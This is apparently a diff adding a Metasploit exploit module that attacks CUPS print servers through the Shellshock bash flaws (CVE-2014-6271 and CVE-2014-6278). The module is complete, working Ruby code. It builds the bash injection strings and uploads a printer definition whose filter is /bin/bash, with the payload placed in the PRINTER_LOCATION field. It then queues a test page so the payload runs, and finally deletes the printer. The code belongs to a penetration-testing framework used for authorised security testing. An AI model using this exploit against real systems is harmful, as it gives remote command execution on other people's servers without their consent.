@@ -1,0 +1,276 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'CUPS Filter Bash Environment Variable Code Injection (Shellshock)',
+      'Description' => %q{
+        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
+        handles external environment variables. This module targets CUPS filters through
+        the PRINTER_INFO and PRINTER_LOCATION variables. A valid username and password is
+        required to exploit this vulnerability through CUPS.
+      },
+      'Author' => [
+        'Stephane Chazelas', # Vulnerability discovery
+        'lcamtuf', # CVE-2014-6278
+        'Brendan Coles <bcoles[at]gmail.com>' # msf
+      ],
+      'References' => [
+        ['CVE', '2014-6271'],
+        ['CVE', '2014-6278'],
+        ['CWE', '94'],
+        ['OSVDB', '112004'],
+        ['EDB', '34765'],
+        ['URL', 'https://access.redhat.com/articles/1200223'],
+        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
+      ],
+      'Privileged' => false,
+      'Arch' => ARCH_CMD,
+      'Platform' => 'unix',
+      'Payload' =>
+        {
+          'Space' => 1024,
+          'BadChars' => "\x00\x0A\x0D",
+          'DisableNops' => true,
+          'Compat' =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic awk ruby'
+            },
+        },
+      # Tested:
+      # - CUPS version 1.4.3 on Ubuntu 10.04 (x86)
+      # - CUPS version 1.5.3 on Debian 7 (x64)
+      # - CUPS version 1.6.2 on Fedora 19 (x64)
+      # - CUPS version 1.7.2 on Ubuntu 14.04 (x64)
+      'Targets' =>  [[ 'Automatic Targeting', { 'auto' => true } ]],
+      'DefaultTarget' => 0,
+      'DisclosureDate' => 'Sep 24 2014',
+      'License' => MSF_LICENSE
+    ))
+    register_options([
+      Opt::RPORT(631),
+      OptBool.new('SSL', [ true, 'Use SSL', true ]),
+      OptString.new('HttpUsername', [ true, 'CUPS username', 'root']),
+      OptString.new('HttpPassword', [ true, 'CUPS user password', '']),
+      OptEnum.new('CVE', [ true, 'CVE to exploit', 'CVE-2014-6271', ['CVE-2014-6271', 'CVE-2014-6278'] ]),
+      OptString.new('RPATH', [ true, 'Target PATH for binaries', '/bin' ])
+    ], self.class)
+  end
+
+  #
+  # CVE-2014-6271
+  #
+  def cve_2014_6271(cmd)
+    %{() { :;}; $(#{cmd}) & }
+  end
+
+  #
+  # CVE-2014-6278
+  #
+  def cve_2014_6278(cmd)
+    %{() { _; } >_[$($())] { echo -e "\r\n$(#{cmd})\r\n" ; }}
+  end
+
+  #
+  # Check credentials
+  #
+  def check
+    @cookie = rand_text_alphanumeric(16)
+    printer_name = rand_text_alphanumeric(10 + rand(5))
+    res = add_printer(printer_name, '')
+    if !res
+      vprint_error("No response from host")
+      return Exploit::CheckCode::Unknown
+    elsif res.headers['Server'] =~ /CUPS\/([\d\.]+)/
+      vprint_status("Found CUPS version #{$1}")
+    else
+      print_status("Target is not a CUPS web server")
+      return Exploit::CheckCode::Safe
+    end
+    if res.body =~ /Set Default Options for #{printer_name}/
+      vprint_good("Added printer successfully")
+      delete_printer(printer_name)
+    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])
+      vprint_error("Authentication failed")
+    elsif res.code == 426
+      vprint_error("SSL required - set SSL true")
+    end
+    Exploit::CheckCode::Detected
+  end
+
+  #
+  # Exploit
+  #
+  def exploit
+    @cookie = rand_text_alphanumeric(16)
+    printer_name = rand_text_alphanumeric(10 + rand(5))
+
+    # Select target CVE
+    case datastore['CVE']
+    when 'CVE-2014-6278'
+      cmd = cve_2014_6278(payload.raw)
+    else
+      cmd = cve_2014_6271(payload.raw)
+    end
+
+    # Add a printer containing the payload
+    # with a CUPS filter pointing to /bin/bash
+    res = add_printer(printer_name, cmd)
+    if !res
+      fail_with(Failure::Unreachable, "#{peer} - Could not add printer - Connection failed.")
+    elsif res.body =~ /Set Default Options for #{printer_name}/
+      print_good("Added printer successfully")
+    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])
+      fail_with(Failure::NoAccess, "#{peer} - Could not add printer - Authentication failed.")
+    elsif res.code == 426
+      fail_with(Failure::BadConfig, "#{peer} - Could not add printer - SSL required - set SSL true.")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Could not add printer.")
+    end
+
+    # Add a test page to the print queue.
+    # The print job triggers execution of the bash filter
+    # which executes the payload in the environment variables.
+    res = print_test_page(printer_name)
+    if !res
+      fail_with(Failure::Unreachable, "#{peer} - Could not add test page to print queue - Connection failed.")
+    elsif res.body =~ /Test page sent; job ID is/
+      vprint_good("Added test page to printer queue")
+    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])
+      fail_with(Failure::NoAccess, "#{peer} - Could not add test page to print queue - Authentication failed.")
+    elsif res.code == 426
+      fail_with(Failure::BadConfig, "#{peer} - Could not add test page to print queue - SSL required - set SSL true.")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Could not add test page to print queue.")
+    end
+
+    # Delete the printer
+    res = delete_printer(printer_name)
+    if !res
+      fail_with(Failure::Unreachable, "#{peer} - Could not delete printer - Connection failed.")
+    elsif res.body =~ /has been deleted successfully/
+      print_status("Deleted printer '#{printer_name}' successfully")
+    elsif res.code == 401 || (res.code == 426 && datastore['SSL'])
+      vprint_warning("Could not delete printer '#{printer_name}' - Authentication failed.")
+    elsif res.code == 426
+      vprint_warning("Could not delete printer '#{printer_name}' - SSL required - set SSL true.")
+    else
+      vprint_warning("Could not delete printer '#{printer_name}'")
+    end
+  end
+
+  #
+  # Add a printer to CUPS
+  #
+  def add_printer(printer_name, cmd)
+    vprint_status("Adding new printer '#{printer_name}'")
+
+    ppd_name = "#{rand_text_alphanumeric(10 + rand(5))}.ppd"
+    ppd_file = <<-EOF
+*PPD-Adobe: "4.3"
+*%==== General Information Keywords ========================
+*FormatVersion: "4.3"
+*FileVersion: "1.00"
+*LanguageVersion: English
+*LanguageEncoding: ISOLatin1
+*PCFileName: "#{ppd_name}"
+*Manufacturer: "Brother"
+*Product: "(Brother MFC-3820CN)"
+*1284DeviceID: "MFG:Brother;MDL:MFC-3820CN"
+*cupsVersion: 1.1
+*cupsManualCopies: False
+*cupsFilter: "application/vnd.cups-postscript 0 #{datastore['RPATH']}/bash"
+*cupsModelNumber: #{rand(10) + 1}
+*ModelName: "Brother MFC-3820CN"
+*ShortNickName: "Brother MFC-3820CN"
+*NickName: "Brother MFC-3820CN CUPS v1.1"
+*%
+*%==== Basic Device Capabilities =============
+*LanguageLevel: "3"
+*ColorDevice: True
+*DefaultColorSpace: RGB
+*FileSystem: False
+*Throughput: "12"
+*LandscapeOrientation: Plus90
+*VariablePaperSize: False
+*TTRasterizer: Type42
+*FreeVM: "1700000"
+
+*DefaultOutputOrder: Reverse
+*%==== Media Selection ======================
+
+*OpenUI *PageSize/Media Size: PickOne
+*OrderDependency: 18 AnySetup *PageSize
+*DefaultPageSize: BrLetter
+*PageSize BrA4/A4:				"<</PageSize[595 842]/ImagingBBox null>>setpagedevice"
+*PageSize BrLetter/Letter:			"<</PageSize[612 792]/ImagingBBox null>>setpagedevice"
+EOF
+
+    pd = Rex::MIME::Message.new
+    pd.add_part(ppd_file, 'application/octet-stream', nil, %(form-data; name="PPD_FILE"; filename="#{ppd_name}"))
+    pd.add_part("#{@cookie}", nil, nil, %(form-data; name="org.cups.sid"))
+    pd.add_part("add-printer", nil, nil, %(form-data; name="OP"))
+    pd.add_part("#{printer_name}", nil, nil, %(form-data; name="PRINTER_NAME"))
+    pd.add_part("", nil, nil, %(form-data; name="PRINTER_INFO")) # injectable
+    pd.add_part("#{cmd}", nil, nil, %(form-data; name="PRINTER_LOCATION")) # injectable
+    pd.add_part("file:///dev/null", nil, nil, %(form-data; name="DEVICE_URI"))
+
+    data = pd.to_s
+    data.strip!
+
+    send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin'),
+      'ctype' => "multipart/form-data; boundary=#{pd.bound}",
+      'data' => data,
+      'cookie' => "org.cups.sid=#{@cookie};",
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
+    )
+  end
+
+  #
+  # Queue a printer test page
+  #
+  def print_test_page(printer_name)
+    vprint_status("Adding test page to printer queue")
+    send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'printers', printer_name),
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+      'cookie' => "org.cups.sid=#{@cookie}",
+      'vars_post' => {
+        'org.cups.sid' => @cookie,
+        'OP' => 'print-test-page'
+      }
+    )
+  end
+
+  #
+  # Delete a printer
+  #
+  def delete_printer(printer_name)
+    vprint_status("Deleting printer '#{printer_name}'")
+    send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin'),
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+      'cookie' => "org.cups.sid=#{@cookie}",
+      'vars_post' => {
+        'org.cups.sid' => @cookie,
+        'OP' => 'delete-printer',
+        'printer_name' => printer_name,
+        'confirm' => 'Delete Printer'
+      }
+    )
+  end
+
+end
